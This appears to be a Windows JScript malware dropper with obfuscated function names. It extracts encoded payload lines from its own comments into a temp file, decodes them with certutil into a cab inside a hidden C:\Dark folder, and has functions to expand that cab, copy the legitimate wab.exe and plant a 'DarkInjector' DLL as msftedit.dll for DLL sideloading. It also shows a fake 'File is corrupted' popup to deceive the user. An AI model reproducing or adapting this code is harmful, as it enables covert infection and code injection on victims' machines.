function a1(a2, a3) {
    var a4, a5, a6, a7, a8;
    a8 = "Scripting.FileSystemObject";
    a7 = "WScript.Shell";
    a4 = new ActiveXObject(a7);
    a5 = new ActiveXObject(a8);
    a6 = "certutil -decode \"" + a2 + "\" " + a3;
    a4.Run(a6, 0, true);
}

function b1(b2, b3) {
    var b4, b5, b6, b7, b8;
    b8 = "Scripting.FileSystemObject";
    b7 = "WScript.Shell";
    b4 = new ActiveXObject(b7);
    b5 = new ActiveXObject(b8);
    b6 = "expand " + b2 + " -F:* " + b3;
    b4.Run(b6, 0, true);
}

function c1(c2) {
    var c3, c4;
    c3 = new ActiveXObject("Scripting.FileSystemObject");
    if (!c3.FolderExists(c2)) {
        c4 = c3.CreateFolder(c2);
        c4.Attributes = c4.Attributes | 2;
    }
    c4 = null;
    c3 = null;
}

function d1(d2) {
    var d3, d4;
    d4 = "WScript.Shell";
    d3 = new ActiveXObject(d4);
    d3.Run(d2, 0, true);
	d3.Popup("File is corrupted", 0, "Error", 0x10);
}

function getOSArch() {
    var sh, arch;
    sh = new ActiveXObject("WScript.Shell");
    arch = sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%");
    var archW = sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITEW6432%");
    if (archW !== "%PROCESSOR_ARCHITEW6432%") {
        arch = archW;
    }
    return arch;
}

function copyWab(darkFolder) {
    var fso, src, dst;
    fso = new ActiveXObject("Scripting.FileSystemObject");
    src = "C:\\Program Files\\Windows Mail\\wab.exe";
    dst = darkFolder + "wab.exe";

    if (fso.FileExists(src)) {
        fso.CopyFile(src, dst, true);
    } else {
        src = "C:\\Program Files (x86)\\Windows Mail\\wab.exe";
        if (fso.FileExists(src)) {
            fso.CopyFile(src, dst, true);
        }
    }
    fso = null;
}

function renameInjector(darkFolder) {
    var fso, arch, srcDll, dstDll;
    fso = new ActiveXObject("Scripting.FileSystemObject");
    arch = getOSArch();

    if (arch === "AMD64" || arch === "ARM64") {
        srcDll = darkFolder + "DarkInjector_64.dll";
    } else {
        srcDll = darkFolder + "DarkInjector_32.dll";
    }
    dstDll = darkFolder + "msftedit.dll";

    if (fso.FileExists(srcDll)) {
        fso.CopyFile(srcDll, dstDll, true);
    }
    fso = null;
}

var x1, x2, x3, x4, x5, x6, x7, x8, x9, s1;
x6 = "WScript.Shell";
x1 = new ActiveXObject(x6);
x2 = x1.ExpandEnvironmentStrings("%TEMP%");
x3 = x1.ExpandEnvironmentStrings("%SYSTEMDRIVE%");
x4 = x2 + "\\output.txt";
x5 = x3 + "\\Dark\\";


x7 = new ActiveXObject("Scripting.FileSystemObject");
x8 = x7.OpenTextFile(WScript.ScriptFullName, 1);
x9 = x7.OpenTextFile(x4, 2, true); 
while (!x8.AtEndOfStream) {
    s1 = x8.ReadLine();
    if (s1.indexOf("//") === 0) {
        x9.WriteLine(s1.substring(2));
    }
}

x8.Close();
x9.Close();

x8 = null;
x9 = null;
x7 = null;

c1(x5);
a1(x4, x5 + "DE.cab");
